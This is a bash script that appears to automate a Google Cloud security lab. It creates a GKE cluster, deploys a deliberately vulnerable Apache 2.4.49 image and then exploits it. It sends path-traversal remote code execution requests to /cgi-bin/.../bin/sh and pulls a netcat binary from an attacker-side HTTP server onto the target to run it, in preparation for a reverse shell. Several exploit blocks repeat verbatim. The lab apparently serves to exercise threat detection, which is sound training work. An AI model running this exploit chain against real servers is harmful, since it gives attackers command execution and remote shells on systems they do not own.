BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}Starting${RESET}" "${GREEN}${BOLD}Execution${RESET}"

sudo snap remove google-cloud-cli
curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
./google-cloud-sdk/install.sh

. ~/.bashrc
gcloud components install kubectl gke-gcloud-auth-plugin --quiet
gcloud container clusters create test-cluster \
--zone "$ZONE" \
--enable-private-nodes \
--enable-private-endpoint \
--enable-ip-alias \
--num-nodes=1 \
--master-ipv4-cidr "172.16.0.0/28" \
--enable-master-authorized-networks \
--master-authorized-networks "$IP"
sleep 30
while true; do
    output=$(kubectl describe daemonsets container-watcher -n kube-system)
    if [[ $output == *container-watcher-unique-id* ]]; then
        echo "Found unique ID in the output:"
        echo "$output"
        break
    else
        echo "Please Wait for sometime..."
        sleep 10
    fi
done

kubectl create deployment apache-deployment \
--replicas=1 \
--image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable
kubectl expose deployment apache-deployment \
--name apache-test-service  \
--type NodePort \
--protocol TCP \
--port 80
NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
NODE_PORT=$(kubectl get service apache-test-service \
-o jsonpath={.spec.ports[0].nodePort})
gcloud compute firewall-rules create apache-test-service-fw \
--allow tcp:${NODE_PORT}
gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"
gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}
python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"
gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}
python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &

curl http://${LOCAL_IP}:8888
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"
pkill python
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; /tmp/nc"
